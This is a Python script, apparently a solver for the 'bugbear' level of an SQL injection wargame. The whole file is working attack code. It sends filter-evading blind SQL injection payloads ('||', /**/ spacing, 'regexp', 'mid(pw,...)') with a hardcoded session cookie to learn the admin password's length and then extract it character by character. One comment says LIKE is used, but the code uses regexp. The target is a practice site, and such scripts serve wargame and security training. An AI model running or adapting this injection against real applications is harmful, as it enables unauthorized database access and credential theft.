import urllib.request
from urllib.parse import quote

key = ""

pwlen = 0

for i in range(1, 20):
    url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="
    data = '-1/**/||/**/length(pw)/**/regexp/**/"^{}$"#'.format(str(i)) # = 을 못쓰므로 LIKE 로 수정
    print(data)
    data = quote(data)
    re = urllib.request.Request(url + data)

    re.add_header(
        "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
    re.add_header(
        "Cookie", "PHPSESSID=bb9ultdedrmse87p4473hmms81"
    )

    req = urllib.request.urlopen(re)

    if str(req.read()).find("Hello admin") != -1:
        pwlen = i
        print('pw length : ' + str(pwlen))
        break

for i in range(1, pwlen + 1):
    for j in range(32, 127):
        url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="
        data = '-1/**/||/**/mid(pw,1,{})/**/regexp/**/"^{}$"#'.format(
            str(i), key + chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=bb9ultdedrmse87p4473hmms81"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)